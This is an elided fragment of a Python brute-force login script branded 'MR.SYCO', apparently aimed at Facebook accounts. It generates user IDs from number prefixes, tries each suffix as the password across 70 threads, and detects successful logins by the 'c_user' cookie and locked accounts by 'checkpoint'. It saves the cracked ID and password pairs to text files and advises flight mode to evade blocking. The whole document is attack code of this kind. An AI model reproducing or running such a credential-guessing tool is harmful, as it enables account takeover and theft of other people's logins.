...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 92355 92345,92318,92334,****Etc')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        print('\x1b[1;91m If no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SYCO-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SYCO-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SYCO-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('SYCO-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR.SYCO\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
